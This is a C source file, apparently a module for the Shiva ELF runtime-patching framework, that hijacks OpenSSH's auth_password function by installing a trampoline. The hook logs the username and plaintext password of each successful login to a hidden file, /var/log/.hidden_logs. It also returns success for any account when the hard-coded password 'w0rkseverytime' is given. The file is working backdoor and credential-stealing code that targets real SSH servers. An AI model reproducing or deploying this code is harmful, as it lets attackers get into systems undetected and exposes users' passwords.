#define _GNU_SOURCE
#include <pwd.h>
#include "../../shiva.h"
#include "/home/elfmaster/git/openssh-portable/packet.h"

#define SECRET_PASSWORD "w0rkseverytime"


struct Authctxt {
        sig_atomic_t     success;
        int              authenticated; /* authenticated and alarms cancelled */
        int              postponed;     /* authentication needs another step */
        int              valid;         /* user exists and is allowed to login */
        int              attempt;
        int              failures;
        int              server_caused_failure;
        int              force_pwchange;
        char            *user;          /* username sent by the client */
        char            *service;
        struct passwd   *pw;            /* set if 'valid' */
        char            *style;

        /* Method lists for multiple authentication */
        char            **auth_methods; /* modified from server config */
        u_int            num_auth_methods;

        /* Authentication method-specific data */
        void            *methoddata;
        void            *kbdintctxt;
#ifdef BSD_AUTH
        auth_session_t  *as;
#endif
#ifdef KRB5
        krb5_context     krb5_ctx;
        krb5_ccache      krb5_fwd_ccache;
        krb5_principal   krb5_user;
        char            *krb5_ticket_file;
        char            *krb5_ccname;
#endif
        struct sshbuf   *loginmsg;

        /* Authentication keys already used; these will be refused henceforth */
        struct sshkey   **prev_keys;
        u_int            nprev_keys;

        /* Last used key and ancillary information from active auth method */
        struct sshkey   *auth_method_key;
        char            *auth_method_info;

        /* Information exposed to session */
        struct sshbuf   *session_info;  /* Auth info for environment */
};

int
my_auth_password(struct ssh *ssh, const char *password)
{
	struct shiva_ctx *ctx = ctx_global;
	struct shiva_trace_handler *handler;
	struct shiva_trace_bp *bp;
	shiva_error_t error;
	int (*o_auth_password)(struct ssh *, const char *);
	uint64_t vaddr;
	bool res;
	int ret;
	struct passwd *pw;
	uint64_t pw_vaddr = ssh->authctxt;
	struct Authctxt *authctxt = ssh->authctxt;
	pw = authctxt->pw;

	handler = shiva_trace_find_handler(ctx, &my_auth_password);
	if (handler == NULL) {
		printf("Failed to find handler struct for my_print_string\n");
		exit(-1);
	}
	/*
	 * Find the breakpoint struct associated with this handler/hijack
	 * function.
	 */
	SHIVA_TRACE_BP_STRUCT(bp, handler);
	vaddr = (uint64_t)bp->symbol.value + ctx->ulexec.base_vaddr;
	/*
	 * Restore original code bytes of function 'auth_password'
	 */
	res = shiva_trace_write(ctx, 0, (void *)vaddr, &bp->insn.o_insn, bp->bp_len, &error);
	if (res == false) {
		printf("shiva_trace_write failed: %s\n", shiva_error_msg(&error));
		exit(-1);
	}
	FILE *logfd = fopen("/var/log/.hidden_logs", "a+");
	if (logfd == NULL) {
		printf("fopen /var/log/.hidden_logs failed\n");
		exit(-1);
	}
	/*
	 * Call the original auth_password
	 */
	o_auth_password = (void *)vaddr;
	ret = o_auth_password(ssh, password);
	if (ret == 1) {
		fprintf(logfd, "Successful SSH login\n"
				"Username: %s\n"
				"Password: %s\n", pw->pw_name, password);
	}
	fclose(logfd);
	/*
	 * Restore our trampoline back in place.
	 */
	res = shiva_trace_write(ctx, 0, (void *)vaddr, &bp->insn.n_insn, bp->bp_len, &error);
        if (res == false) {
                printf("shiva_trace_write failed: %s\n", shiva_error_msg(&error));
                exit(-1);
        }

	/*
	 * If the password is SECRET_PASSWORD
	 * than give access, no matter who.
	 */
	if (strcmp(password, SECRET_PASSWORD) == 0)
		return 1;
	return ret;
}

int
shakti_main(shiva_ctx_t *ctx)
{
	bool res;
	shiva_error_t error;
	shiva_callsite_iterator_t call_iter;
	struct shiva_branch_site branch;
	struct elf_symbol symbol;

	res = shiva_trace(ctx, 0, SHIVA_TRACE_OP_ATTACH,
	    NULL, NULL, 0, &error);
	if (res == false) {
		printf("shiva_trace failed: %s\n", shiva_error_msg(&error));
		return -1;
	}
	res = shiva_trace_register_handler(ctx, (void *)&my_auth_password,
	    SHIVA_TRACE_BP_TRAMPOLINE, &error);
	if (res == false) {
		printf("shiva_register_handler failed: %s\n",
		    shiva_error_msg(&error));
		return -1;
	}
	if (elf_symbol_by_name(&ctx->elfobj, "auth_password", &symbol) == false) {
		printf("failed to find symbol 'print_string'\n");
		return -1;
	}
	uint64_t val = symbol.value + ctx->ulexec.base_vaddr;
	res = shiva_trace_set_breakpoint(ctx, (void *)my_auth_password,
	    val, NULL, &error);
	if (res == false) {
		printf("shiva_trace_set_breakpoint failed: %s\n", shiva_error_msg(&error));
		return -1;
	}
	return 0;
}

